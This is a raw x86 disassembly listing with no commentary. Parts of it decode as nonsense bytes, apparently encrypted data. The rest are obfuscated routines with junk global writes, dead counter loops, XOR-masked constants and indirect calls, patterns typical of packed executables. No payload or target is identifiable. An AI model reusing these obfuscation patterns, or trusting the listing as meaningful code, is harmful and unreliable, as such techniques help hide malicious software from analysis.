  40f049:	sbb    BYTE PTR [esi-0x73],bh
  40f04c:	imul   eax,DWORD PTR ds:0x9e6e82d5,0x948b210f
  40f056:	in     al,dx
  40f057:	cmp    DWORD PTR [esi],esi
  40f059:	push   eax
  40f05a:	out    dx,eax
  40f05b:	cmovp  ebp,ebp
  40f05e:	outs   dx,DWORD PTR ds:[esi]
  40f05f:	sbb    ebp,DWORD PTR [edi-0x1a]
  40f062:	push   es
  40f063:	jge    0x40f06c
  40f065:	addr16 pop ss
  40f067:	push   es
  40f068:	and    al,0x8
  40f06a:	pop    ecx
  40f06b:	pop    es
  40f06c:	pop    ss
  40f06d:	scas   al,BYTE PTR es:[edi]
  40f06e:	repz and DWORD PTR [ecx+0x9],esi
  40f072:	cld    
  40f073:	mov    dl,0x3b
  40f075:	rcl    BYTE PTR [ebp+0x7c41b7c1],cl
  40f07b:	adc    eax,0xe816ddff
  40f080:	lods   al,BYTE PTR ds:[esi]
  40f081:	popa   
  40f082:	jmp    0x2fae:0x8bcdfe67
  40f089:	sahf   
  40f08a:	xchg   dl,dh
  40f08c:	xchg   ebx,eax
  40f08d:	inc    esp
  40f08e:	sbb    BYTE PTR [ebp-0x396359e1],ch
  40f094:	xor    BYTE PTR [edx-0x2d1a1229],dl
  40f09a:	sbb    al,0x2a
  40f09c:	jo     0x40f0d2
  40f09e:	sbb    ch,BYTE PTR [eax]
  40f0a0:	jmp    0xfaac:0x9e1492c7
  40f0a7:	lahf   
  40f0a8:	mov    eax,DWORD PTR [ebp-0x7d]
  40f0ab:	and    eax,0xb20b2f2f
  40f0b0:	stc    
  40f0b1:	ret    
  40f0b2:	les    ebx,FWORD PTR [eax+0x53]
  40f0b5:	rol    DWORD PTR [eax-0x2f03e3ac],0x1
  40f0bc:	fbstp  TBYTE PTR fs:[edi-0x57]
  40f0c0:	pop    esi
  40f0c1:	fidiv  DWORD PTR [ecx]
  40f0c3:	adc    ch,BYTE PTR [esi+0x4e7a4e1b]
  40f0c9:	loopne 0x40f109
  40f0cb:	das    
  40f0cc:	icebp  
  40f0cd:	xor    DWORD PTR [eax],edi
  40f0cf:	mov    dl,0xdf
  40f0d1:	cld    
  40f0d2:	add    ecx,DWORD PTR [edx-0x1d4c60f9]
  40f0d8:	mov    ds:0x49ed5f67,al
  40f0dd:	ins    DWORD PTR es:[edi],dx
  40f0de:	in     al,0x15
  40f0e0:	dec    ecx
  40f0e1:	ins    BYTE PTR es:[edi],dx
  40f0e2:	dec    ebx
  40f0e3:	sbb    eax,DWORD PTR [ecx]
  40f0e5:	icebp  
  40f0e6:	minps  xmm1,XMMWORD PTR [ebp+eiz*1+0x63cd204f]
  40f0ee:	jo     0x40f13d
  40f0f0:	push   0xe197f036
  40f0f5:	pop    esp
  40f0f6:	pop    edx
  40f0f7:	test   eax,0x49a3c90a
  40f0fc:	xchg   ebp,eax
  40f0fd:	fist   WORD PTR ds:0x58cd466e
  40f103:	xchg   ebp,ecx
  40f105:	mov    ds:0x9ce4fd8a,al
  40f10a:	xchg   ebp,eax
  40f10b:	inc    ecx
  40f10c:	(bad)  
  40f10d:	clc    
  40f10e:	push   eax
  40f10f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f110:	sub    DWORD PTR [eax+0x735f5e1b],0x6c18bb6e
  40f11a:	(bad)
  40f11d:	mov    dh,0x8e
  40f11f:	shl    BYTE PTR [edx+eax*8],1
  40f122:	ds cmp dh,cl
  40f125:	rcr    BYTE PTR [ebx-0x3e01221f],cl
  40f12b:	sar    BYTE PTR [ebx-0x68],1
  40f12e:	xor    BYTE PTR [esi],dh
  40f130:	jp     0x40f17e
  40f132:	lock mov bl,0x4c
  40f135:	not    DWORD PTR [edx+0xcebed1c]
  40f13b:	dec    ebp
  40f13c:	cmp    ecx,DWORD PTR [ebx-0xfc4f38b]
  40f142:	mov    eax,DWORD PTR [ebp-0x4]
  40f145:	je     0x40cd96
  40f14b:	xor    eax,edx
  40f14d:	add    eax,ecx
  40f14f:	mov    ecx,DWORD PTR [ebp+0xc]
  40f152:	imul   eax,ecx
  40f155:	add    eax,DWORD PTR [ebp+0x8]
  40f158:	mov    DWORD PTR [ebp+0xc],eax
  40f15b:	mov    eax,DWORD PTR [ebp+0xc]
  40f15e:	pop    esi
  40f15f:	leave  
  40f160:	ret    0x8
  40f163:	push   ebp
  40f164:	mov    ebp,esp
  40f166:	push   ecx
  40f167:	or     eax,0x63ef
  40f16c:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  40f173:	adc    DWORD PTR ds:0x429004,0x1463
  40f17d:	mov    eax,DWORD PTR [ebp-0x4]
  40f180:	mov    edx,DWORD PTR [ebp+0x10]
  40f183:	mov    ecx,DWORD PTR ds:0x42b010
  40f189:	add    DWORD PTR ds:0x42a000,ecx
  40f18f:	mov    ecx,0x7510896
  40f194:	neg    DWORD PTR ds:0x42b010
  40f19a:	xor    eax,ecx
  40f19c:	add    eax,0x3272dd
  40f1a1:	and    DWORD PTR ds:0x429010,0xb4c
  40f1ab:	mov    DWORD PTR [edx],eax
  40f1ad:	and    DWORD PTR ds:0x42c01c,0x0
  40f1b7:	jmp    0x40f1c9
  40f1bc:	mov    edx,DWORD PTR ds:0x42c01c
  40f1c2:	inc    edx
  40f1c3:	mov    DWORD PTR ds:0x42c01c,edx
  40f1c9:	cmp    DWORD PTR ds:0x42c01c,0x1b
  40f1d0:	jae    0x40f1f8
  40f1d6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f1dd:	jne    0x40f1f3
  40f1e3:	push   0x22f2
  40f1e8:	push   0x42e134
  40f1ed:	call   DWORD PTR ds:0x42ed5d
  40f1f3:	jmp    0x40f1bc
  40f1f8:	mov    eax,DWORD PTR [ebp+0xc]
  40f1fb:	or     DWORD PTR ds:0x42a004,ecx
  40f201:	xor    eax,ecx
  40f203:	push   esi
  40f204:	mov    esi,DWORD PTR [ebp+0x10]
  40f207:	mov    edx,0x3272dd
  40f20c:	add    eax,edx
  40f20e:	mov    DWORD PTR [esi+0x4],eax
  40f211:	mov    eax,DWORD PTR [ebp+0x14]
  40f214:	mov    esi,DWORD PTR [ebp+0x10]
  40f217:	mov    DWORD PTR [esi+0x8],eax
  40f21a:	mov    eax,DWORD PTR [ebp+0x18]
  40f21d:	mov    esi,DWORD PTR [ebp+0x10]
  40f220:	mov    DWORD PTR [esi+0xc],eax
  40f223:	mov    eax,DWORD PTR [ebp+0x1c]
  40f226:	mov    esi,DWORD PTR [ebp+0x10]
  40f229:	mov    DWORD PTR [esi+0x10],eax
  40f22c:	mov    eax,DWORD PTR [ebp+0x8]
  40f22f:	xor    eax,ecx
  40f231:	add    eax,edx
  40f233:	pop    esi
  40f234:	leave  
  40f235:	ret    0x18
  40f238:	push   ebp
  40f239:	mov    ebp,esp
  40f23b:	sub    esp,0xa4
  40f241:	adc    eax,0x77b8
  40f246:	mov    ecx,DWORD PTR [ebp+0x8]
  40f249:	adc    DWORD PTR ds:0x429000,edi
  40f24f:	mov    eax,0x8a89
  40f254:	adc    DWORD PTR ds:0x42900c,0x429028
  40f25e:	xor    ax,WORD PTR [ecx+0x20]
  40f262:	mov    ecx,DWORD PTR ds:0x429028
  40f268:	and    DWORD PTR ds:0x42b00c,ecx
  40f26e:	mov    ecx,0x3b4c
  40f273:	dec    DWORD PTR ds:0x42d014
  40f279:	add    ax,cx
  40f27c:	movzx  eax,ax
  40f27f:	add    ecx,0x1468
  40f285:	mov    DWORD PTR [ebp-0x18],eax
  40f288:	mov    BYTE PTR [ebp-0x1],0x7d
  40f28c:	mov    ecx,DWORD PTR ds:0x412000
  40f292:	mov    ecx,DWORD PTR [ecx]
  40f294:	adc    DWORD PTR ds:0x42d01c,ecx
  40f29a:	lea    eax,[ebp-0x1]
  40f29d:	sub    DWORD PTR ds:0x42c014,0xae5
  40f2a7:	mov    DWORD PTR [ebp-0x10],eax
  40f2aa:	mov    al,BYTE PTR [ebp-0x1]
  40f2ad:	inc    ecx
  40f2ae:	mov    ecx,DWORD PTR [ebp-0x10]
  40f2b1:	xor    al,0x71
  40f2b3:	adc    DWORD PTR ds:0x42b018,0x264
  40f2bd:	sub    al,0xb
  40f2bf:	adc    DWORD PTR ds:0x429014,0x5cc7
  40f2c9:	mov    BYTE PTR [ecx],al
  40f2cb:	mov    DWORD PTR ds:0x42b004,0x11
  40f2d5:	cmp    DWORD PTR ds:0x42b004,0x0
  40f2dc:	je     0x40f31e
  40f2e2:	cmp    DWORD PTR ds:0x42b004,0x1d
  40f2e9:	jne    0x40f304
  40f2ef:	push   0x42e000
  40f2f4:	push   DWORD PTR [ebp-0x18]
  40f2f7:	push   0x0
  40f2f9:	push   0x4fbc
  40f2fe:	call   DWORD PTR ds:0x42ed61
  40f304:	mov    eax,ds:0x42b004
  40f309:	dec    eax
  40f30a:	mov    ds:0x42b004,eax
  40f30f:	jmp    0x40f2d5
  40f314:	sbb    DWORD PTR ds:0x42d010,0x7483
  40f31e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40f325:	push   ebx
  40f326:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  40f32d:	mov    ecx,DWORD PTR [ebp-0x14]
  40f330:	push   esi
  40f331:	and    DWORD PTR ds:0x42a01c,0x0
  40f33b:	jmp    0x40f34d
  40f340:	mov    esi,DWORD PTR ds:0x42a01c
  40f346:	inc    esi
  40f347:	mov    DWORD PTR ds:0x42a01c,esi
  40f34d:	cmp    DWORD PTR ds:0x42a01c,0x1f
  40f354:	jae    0x40f3f6
  40f35a:	cmp    DWORD PTR ds:0x42a01c,0x21
  40f361:	jne    0x40f377
  40f367:	push   0x42c010
  40f36c:	push   0x562e
  40f371:	call   DWORD PTR ds:0x42ed65
  40f377:	jmp    0x40f340
  40f37c:	and    DWORD PTR ds:0x42d01c,0x0
  40f386:	xor    eax,eax
  40f388:	or     eax,DWORD PTR ds:0x42d01c
  40f38e:	inc    eax
  40f38f:	mov    ds:0x42d01c,eax
  40f394:	cmp    DWORD PTR ds:0x42d01c,0xb
  40f39b:	jne    0x40f3c1
  40f3a1:	push   DWORD PTR [ebp-0x24]
  40f3a4:	push   0x42a010
  40f3a9:	push   0x78c6
  40f3ae:	push   0x42e134
  40f3b3:	push   DWORD PTR [ebp-0x1c]
  40f3b6:	push   0x1e85
  40f3bb:	call   DWORD PTR ds:0x42ed6d
  40f3c1:	cmp    DWORD PTR ds:0x42d01c,0xa
  40f3c8:	jne    0x40f3d9
  40f3ce:	mov    eax,ds:0x42d01c
  40f3d3:	inc    eax
  40f3d4:	mov    ds:0x42d01c,eax
  40f3d9:	cmp    DWORD PTR ds:0x42d01c,0x18
  40f3e0:	jb     0x40f386
  40f3e6:	xor    eax,eax
  40f3e8:	xor    eax,DWORD PTR ds:0x411ff4
  40f3ee:	mov    eax,DWORD PTR [eax]
  40f3f0:	or     DWORD PTR ds:0x42b018,eax
  40f3f6:	mov    eax,0x7510896
  40f3fb:	sbb    DWORD PTR ds:0x42a01c,edx
  40f401:	xor    ecx,eax
  40f403:	or     esi,DWORD PTR ds:0x42a008
  40f409:	mov    esi,0x3272dd
  40f40e:	push   edi
  40f40f:	add    ecx,esi
  40f411:	jmp    0x40f435
  40f416:	mov    DWORD PTR ds:0x42a01c,0x2feb
  40f420:	mov    dl,BYTE PTR [ebp-0x1]
  40f423:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40f42a:	mov    DWORD PTR ds:0x42b01c,0x5ed5
  40f434:	inc    ecx
  40f435:	cmp    ecx,0x40
  40f438:	jb     0x40f416
  40f43e:	mov    DWORD PTR ds:0x429018,0x19
  40f448:	cmp    DWORD PTR ds:0x429018,0x0
  40f44f:	je     0x40f47c
  40f455:	cmp    DWORD PTR ds:0x429018,0x1d
  40f45c:	jne    0x40f468
  40f462:	call   DWORD PTR ds:0x42ed71
  40f468:	mov    edx,DWORD PTR ds:0x429018
  40f46e:	dec    edx
  40f46f:	mov    DWORD PTR ds:0x429018,edx
  40f475:	jmp    0x40f448
  40f47a:	not    edx
  40f47c:	mov    edx,DWORD PTR [ebp-0x14]
  40f47f:	sub    DWORD PTR ds:0x42c00c,0x42b014
  40f489:	xor    edx,eax
  40f48b:	adc    DWORD PTR ds:0x429024,0x42a018
  40f495:	add    edx,esi
  40f497:	mov    DWORD PTR ds:0x42b014,0x72c9
  40f4a1:	jmp    0x40f5bb
  40f4a6:	dec    DWORD PTR ds:0x429014
  40f4ac:	mov    edi,DWORD PTR [ebp+0x8]
  40f4af:	adc    ecx,DWORD PTR ds:0x42a018
  40f4b5:	mov    ecx,0x8a89
  40f4ba:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f4bf:	and    DWORD PTR ds:0x429008,0x0
  40f4c9:	jmp    0x40f4dd
  40f4ce:	xor    edi,edi
  40f4d0:	xor    edi,DWORD PTR ds:0x429008
  40f4d6:	inc    edi
  40f4d7:	mov    DWORD PTR ds:0x429008,edi
  40f4dd:	cmp    DWORD PTR ds:0x429008,0x10
  40f4e4:	jae    0x40f511
  40f4ea:	cmp    DWORD PTR ds:0x429008,0x19
  40f4f1:	jne    0x40f502
  40f4f7:	push   0x429018
  40f4fc:	call   DWORD PTR ds:0x42ed75
  40f502:	jmp    0x40f4ce
  40f507:	adc    DWORD PTR ds:0x42a010,0x20e4
  40f511:	mov    edi,0x3b4c
  40f516:	sub    DWORD PTR ds:0x42a014,0x7a80
  40f520:	add    cx,di
  40f523:	movzx  ecx,cx
  40f526:	neg    DWORD PTR ds:0x42b000
  40f52c:	mov    DWORD PTR [ebp-0x10],ecx
  40f52f:	and    DWORD PTR ds:0x42a000,0x0
  40f539:	jmp    0x40f54b
  40f53e:	mov    ecx,DWORD PTR ds:0x42a000
  40f544:	inc    ecx
  40f545:	mov    DWORD PTR ds:0x42a000,ecx
  40f54b:	cmp    DWORD PTR ds:0x42a000,0x1f
  40f552:	jae    0x40f57e
  40f558:	cmp    DWORD PTR ds:0x42a000,0x26
  40f55f:	jne    0x40f573
  40f565:	push   0x3463
  40f56a:	push   DWORD PTR [ebp-0x1c]
  40f56d:	call   DWORD PTR ds:0x42ed35
  40f573:	jmp    0x40f53e
  40f578:	or     ecx,0x6b07
  40f57e:	mov    ecx,DWORD PTR [ebp+0x8]
  40f581:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f585:	mov    DWORD PTR ds:0x42a010,0x2266
  40f58f:	xor    ecx,0x8a89
  40f595:	add    ecx,edi
  40f597:	mov    DWORD PTR ds:0x42b018,0x196a
  40f5a1:	mov    edi,DWORD PTR [ebp-0x10]
  40f5a4:	mov    DWORD PTR ds:0x42a018,0x15ce
  40f5ae:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40f5b5:	mov    ecx,0x651b
  40f5ba:	inc    edx
  40f5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5be:	mov    DWORD PTR ds:0x429020,0x7b55
  40f5c8:	cmp    edx,ecx
  40f5ca:	jne    0x40f4a6
  40f5d0:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5d3:	mov    edx,DWORD PTR [ebp+0x10]
  40f5d6:	adc    DWORD PTR ds:0x429008,0x429014
  40f5e0:	xor    ecx,eax
  40f5e2:	mov    DWORD PTR ds:0x429028,0x35c1
  40f5ec:	add    ecx,esi
  40f5ee:	sub    DWORD PTR ds:0x429024,0xd80
  40f5f8:	mov    DWORD PTR [edx],ecx
  40f5fa:	add    ecx,0x553e
  40f600:	mov    ecx,DWORD PTR [ebp-0x14]
  40f603:	add    DWORD PTR ds:0x42901c,0xd2d
  40f60d:	xor    ecx,eax
  40f60f:	add    ecx,esi
  40f611:	mov    DWORD PTR ds:0x42d008,0x74bc
  40f61b:	mov    DWORD PTR [ebp-0x20],ecx
  40f61e:	mov    DWORD PTR ds:0x42a004,edi
  40f624:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  40f62b:	mov    DWORD PTR ds:0x429018,0x1d37
  40f635:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  40f63c:	mov    DWORD PTR ds:0x42901c,0x14b9
  40f646:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  40f64d:	mov    DWORD PTR ds:0x42c000,edx
  40f653:	mov    ecx,DWORD PTR [ebp-0xc]
  40f656:	mov    DWORD PTR ds:0x42a018,0x1347
  40f660:	mov    DWORD PTR [ebp+0x8],ecx
  40f663:	mov    DWORD PTR ds:0x429014,0x4ea
  40f66d:	jmp    0x40f78d
  40f672:	sbb    DWORD PTR ds:0x42a018,0x42c008
  40f67c:	mov    ecx,DWORD PTR [ebp+0x8]
  40f67f:	and    edx,DWORD PTR ds:0x42c00c
  40f685:	mov    edx,DWORD PTR [ebp-0x8]
  40f688:	xor    DWORD PTR ds:0x42a008,0x42a018
  40f692:	xor    ecx,eax
  40f694:	xor    edx,eax
  40f696:	sub    ecx,edx
  40f698:	sub    edx,0x6561
  40f69e:	sub    ecx,esi
  40f6a0:	xor    ecx,eax
  40f6a2:	mov    DWORD PTR [ebp+0x8],ecx
  40f6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6a8:	mov    edx,DWORD PTR [ebp-0x64]
  40f6ab:	sub    DWORD PTR ds:0x42901c,0x6b48
  40f6b5:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6bc:	movzx  edx,WORD PTR ds:0x42900c
  40f6c3:	adc    DWORD PTR ds:0x42c00c,edx
  40f6c9:	mov    DWORD PTR [ebp-0x64],ecx
  40f6cc:	sbb    DWORD PTR ds:0x42a018,0x1891
  40f6d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6d9:	dec    edx
  40f6da:	mov    edx,DWORD PTR [ebp-0x60]
  40f6dd:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6e4:	mov    DWORD PTR [ebp-0x60],ecx
  40f6e7:	sbb    DWORD PTR ds:0x42900c,0x79ab
  40f6f1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6f4:	add    DWORD PTR ds:0x42a01c,edi
  40f6fa:	mov    edx,DWORD PTR [ebp-0x5c]
  40f6fd:	lea    ecx,[edx+ecx*1+0x5708f3]
  40f704:	mov    DWORD PTR [ebp-0x5c],ecx
  40f707:	inc    DWORD PTR ds:0x429004
  40f70d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f710:	sbb    DWORD PTR ds:0x42d018,edx
  40f716:	mov    edx,DWORD PTR [ebp-0x58]
  40f719:	and    DWORD PTR ds:0x42c008,0x42b004
  40f723:	lea    ecx,[edx+ecx*1+0x5708f0]
  40f72a:	dec    edx
  40f72b:	mov    DWORD PTR [ebp-0x58],ecx
  40f72e:	movzx  ecx,WORD PTR ds:0x429000
  40f735:	adc    DWORD PTR ds:0x42c008,ecx
  40f73b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f73e:	mov    edx,DWORD PTR [ebp-0x54]
  40f741:	add    DWORD PTR ds:0x42d004,0x42a014
  40f74b:	lea    ecx,[edx+ecx*1+0x5708f1]
  40f752:	mov    DWORD PTR [ebp-0x54],ecx
  40f755:	xor    DWORD PTR ds:0x42d01c,0x80b
  40f75f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f762:	and    DWORD PTR ds:0x42d008,0x7467
  40f76c:	mov    edx,DWORD PTR [ebp-0x50]
  40f76f:	or     DWORD PTR ds:0x42c004,0x42a000
  40f779:	lea    ecx,[edx+ecx*1+0x5708fe]
  40f780:	add    DWORD PTR ds:0x42c010,0x5221
  40f78a:	mov    DWORD PTR [ebp-0x50],ecx
  40f78d:	or     ecx,DWORD PTR ds:0x429028
  40f793:	mov    ecx,DWORD PTR [ebp+0x8]
  40f796:	xor    ecx,eax
  40f798:	add    ecx,esi
  40f79a:	mov    DWORD PTR ds:0x42c004,0x633d
  40f7a4:	jne    0x40f672
  40f7aa:	jmp    0x411e4d
  40f7af:	neg    DWORD PTR ds:0x42901c
  40f7b5:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7b8:	mov    edx,DWORD PTR [ebp-0x8]
  40f7bb:	sub    DWORD PTR ds:0x429008,0x429014
  40f7c5:	xor    ecx,eax
  40f7c7:	xor    edx,eax
  40f7c9:	sbb    DWORD PTR ds:0x42c018,0x25ac
  40f7d3:	sub    ecx,edx
  40f7d5:	or     DWORD PTR ds:0x42d000,0x429014
  40f7df:	sub    ecx,esi
  40f7e1:	xor    ecx,eax
  40f7e3:	mov    DWORD PTR ds:0x42b018,0x1de
  40f7ed:	mov    DWORD PTR [ebp-0x1c],ecx
  40f7f0:	mov    DWORD PTR ds:0x42c000,0x7d6a
  40f7fa:	mov    ecx,DWORD PTR [ebp-0xc]
  40f7fd:	mov    DWORD PTR ds:0x429028,0x9e0
  40f807:	mov    DWORD PTR [ebp+0x8],ecx
  40f80a:	jmp    0x40f91d
  40f80f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f812:	mov    edx,DWORD PTR [ebp-0x8]
  40f815:	xor    ecx,eax
  40f817:	adc    DWORD PTR ds:0x42c008,ecx
  40f81d:	xor    edx,eax
  40f81f:	xor    DWORD PTR ds:0x42900c,0x3273
  40f829:	sub    ecx,edx
  40f82b:	sub    ecx,esi
  40f82d:	or     edi,edi
  40f82f:	xor    ecx,eax
  40f831:	mov    DWORD PTR [ebp+0x8],ecx
  40f834:	and    DWORD PTR ds:0x429020,0x0
  40f83e:	jmp    0x40f850
  40f843:	mov    edi,DWORD PTR ds:0x429020
  40f849:	inc    edi
  40f84a:	mov    DWORD PTR ds:0x429020,edi
  40f850:	cmp    DWORD PTR ds:0x429020,0x1b
  40f857:	jae    0x40f8a8
  40f85d:	cmp    DWORD PTR ds:0x429020,0x6
  40f864:	jne    0x40f87f
  40f86a:	push   0x6ce2
  40f86f:	push   0x42d018
  40f874:	push   0x18a6
  40f879:	call   DWORD PTR ds:0x42ed39
  40f87f:	cmp    DWORD PTR ds:0x429020,0x5
  40f886:	jne    0x40f899
  40f88c:	mov    edi,DWORD PTR ds:0x429020
  40f892:	inc    edi
  40f893:	mov    DWORD PTR ds:0x429020,edi
  40f899:	jmp    0x40f843
  40f89e:	and    DWORD PTR ds:0x42b004,0x42b01c
  40f8a8:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8ab:	mov    edx,DWORD PTR [ebp+0x8]
  40f8ae:	and    DWORD PTR ds:0x42d010,0x0
  40f8b8:	mov    edi,DWORD PTR ds:0x42d010
  40f8be:	inc    edi
  40f8bf:	mov    DWORD PTR ds:0x42d010,edi
  40f8c5:	cmp    DWORD PTR ds:0x42d010,0x5
  40f8cc:	jne    0x40f8e2
  40f8d2:	push   0x42e11d
  40f8d7:	push   0x42e110
  40f8dc:	call   DWORD PTR ds:0x42ed3d
  40f8e2:	cmp    DWORD PTR ds:0x42d010,0x4
  40f8e9:	jne    0x40f8fc
  40f8ef:	mov    edi,DWORD PTR ds:0x42d010
  40f8f5:	inc    edi
  40f8f6:	mov    DWORD PTR ds:0x42d010,edi
  40f8fc:	cmp    DWORD PTR ds:0x42d010,0x15
  40f903:	jb     0x40f8b8
  40f909:	imul   edx,edx,0x5708f2
  40f90f:	xor    ecx,eax
  40f911:	add    ecx,esi
  40f913:	lea    ecx,[ebp+ecx*4-0x64]
  40f917:	mov    edi,DWORD PTR [ecx]
  40f919:	add    edx,edi
  40f91b:	mov    DWORD PTR [ecx],edx
  40f91d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f920:	xor    ecx,eax
  40f922:	add    ecx,esi
  40f924:	jne    0x40f80f
  40f92a:	mov    ecx,DWORD PTR [ebp-0x20]
  40f92d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f934:	mov    dl,BYTE PTR [ebp-0x1]
  40f937:	cmp    cl,dl
  40f939:	je     0x411dae
  40f93f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f942:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f949:	mov    edx,DWORD PTR [ebp+0xc]
  40f94c:	cmp    cl,BYTE PTR [edx]
  40f94e:	jne    0x411e5f
  40f954:	mov    ecx,DWORD PTR [ebp-0x14]
  40f957:	mov    edx,DWORD PTR [ebp+0xc]
  40f95a:	movsx  edx,BYTE PTR [edx]
  40f95d:	xor    ecx,eax
  40f95f:	add    ecx,esi
  40f961:	cmp    edx,ecx
  40f963:	mov    ecx,DWORD PTR [ebp-0xc]
  40f966:	mov    DWORD PTR [ebp+0x8],ecx
  40f969:	mov    ecx,DWORD PTR [ebp+0x8]
  40f96c:	je     0x411ed9
  40f972:	jmp    0x40f9a7
  40f977:	mov    ecx,DWORD PTR [ebp+0x8]
  40f97a:	mov    edx,DWORD PTR [ebp-0x8]
  40f97d:	xor    ecx,eax
  40f97f:	xor    edx,eax
  40f981:	sub    ecx,edx
  40f983:	sub    ecx,esi
  40f985:	xor    ecx,eax
  40f987:	mov    DWORD PTR [ebp+0x8],ecx
  40f98a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f98d:	mov    edx,DWORD PTR [ebp+0x8]
  40f990:	xor    ecx,eax
  40f992:	imul   edx,edx,0x5708f2
  40f998:	add    ecx,esi
  40f99a:	lea    ecx,[ebp+ecx*4-0x64]
  40f99e:	mov    edi,DWORD PTR [ecx]
  40f9a0:	add    edx,edi
  40f9a2:	mov    DWORD PTR [ecx],edx
  40f9a4:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9a7:	xor    ecx,eax
  40f9a9:	add    ecx,esi
  40f9ab:	jne    0x40f977
  40f9b1:	mov    ecx,DWORD PTR [ebp-0x14]
  40f9b4:	mov    edx,DWORD PTR [ebp+0x8]
  40f9b7:	xor    ecx,eax
  40f9b9:	xor    edx,eax
  40f9bb:	add    ecx,esi
  40f9bd:	add    edx,esi
  40f9bf:	cmp    ecx,edx
  40f9c1:	jae    0x411df3
  40f9c7:	lea    edx,[ecx-0x3272dd]
  40f9cd:	mov    DWORD PTR [ebp-0x18],edx
  40f9d0:	mov    edi,DWORD PTR [ebp-0x18]
  40f9d3:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  40f9da:	lea    edx,[ebp-0x24]
  40f9dd:	mov    DWORD PTR [ebp-0x10],edx
  40f9e0:	mov    edx,DWORD PTR [ebp-0x10]
  40f9e3:	add    DWORD PTR [edx],0x705fa0f
  40f9e9:	mov    ebx,DWORD PTR [ebp-0x10]
  40f9ec:	xor    edi,eax
  40f9ee:	add    edi,DWORD PTR [ebx]
  40f9f0:	lea    edx,[ebp+ecx*4-0x64]
  40f9f4:	mov    ebx,DWORD PTR [edx]
  40f9f6:	xor    edi,ebx
  40f9f8:	mov    DWORD PTR [edx],edi
  40f9fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f9fd:	xor    edx,eax
  40f9ff:	inc    ecx
  40fa00:	inc    DWORD PTR [ebp-0x18]
  40fa03:	add    edx,esi
  40fa05:	jmp    0x411da1
  40fa0a:	fstp   DWORD PTR [ebx]
  40fa0c:	sti    
  40fa0d:	sar    DWORD PTR [ebx-0x4f],1
  40fa10:	jnp    0x40fa2d
  40fa12:	inc    esi
  40fa13:	xchg   ebx,eax
  40fa14:	or     ch,BYTE PTR [eax]
  40fa16:	cmp    eax,0x74750a6e
  40fa1b:	retf   0x7a7a
  40fa1e:	sti    
  40fa1f:	pop    edi
  40fa20:	jp     0x40fa9c
  40fa22:	cmp    bh,BYTE PTR [ebx-0x71]
  40fa25:	sar    edi,0x78
  40fa28:	and    bh,BYTE PTR [esi+esi*4-0x5d]
  40fa2c:	pusha  
  40fa2d:	out    dx,al
  40fa2e:	or     al,BYTE PTR [ebp-0x41]
  40fa31:	xchg   ebx,eax
  40fa32:	out    dx,al
  40fa33:	adc    esp,DWORD PTR [ebp-0x76]
  40fa36:	fwait
  40fa37:	imul   edx,DWORD PTR [esi+0xfee344c],0xffffffa9
  40fa3e:	or     ch,BYTE PTR [ecx]
  40fa40:	mov    eax,0xdcea318d
  40fa45:	ins    BYTE PTR es:[edi],dx
  40fa46:	dec    ebx
  40fa47:	pop    ebx
  40fa48:	push   edx
  40fa49:	pop    esp
  40fa4a:	loope  0x40fa29
  40fa4c:	xchg   edi,eax
  40fa4d:	jl     0x40fa28
  40fa4f:	jle    0x40f9d9
  40fa51:	test   DWORD PTR [eax-0x385245ed],ebp
  40fa57:	in     al,0x39
  40fa59:	jns    0x40fa7c
  40fa5b:	xchg   esp,eax
  40fa5c:	inc    edi
  40fa5d:	cmp    al,dl
  40fa5f:	jo     0x40faa9
  40fa61:	movhlps xmm1,xmm3
  40fa64:	lods   eax,DWORD PTR ds:[esi]
  40fa65:	jmp    0x9b8ff4bf
  40fa6a:	push   ebx
  40fa6b:	mov    eax,ds:0x38b7240c
  40fa70:	aas    
  40fa71:	fwait
  40fa72:	pop    ds
  40fa73:	imul   esp,DWORD PTR [esi-0x5e],0x11086694
  40fa7a:	mov    WORD PTR [esi+0x3a],?
  40fa7d:	stc    
  40fa7e:	aas    
  40fa7f:	sub    BYTE PTR [esi],bl
  40fa81:	loope  0x40fad0
  40fa83:	mov    ds:0x59a21178,al
  40fa88:	test   al,0x20
  40fa8a:	pushf  
  40fa8b:	pop    ebx
  40fa8c:	mov    bh,0xec
  40fa8e:	mov    ecx,0x1ddc6884
  40fa93:	jno    0x40fab6
  40fa95:	fldcw  WORD PTR [eax+ebx*1-0x6c9451c4]
  40fa9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa9d:	adc    DWORD PTR [ebx+0x7062742c],ebp
  40faa3:	not    DWORD PTR ds:0xbe209dfb
  40faa9:	mov    eax,ds:0x16ae76cd
  40faae:	bound  esi,QWORD PTR [ebp-0x41]
  40fab1:	out    0x74,eax
  40fab3:	stos   BYTE PTR es:[edi],al
  40fab4:	pop    ecx
  40fab5:	sub    edi,edx
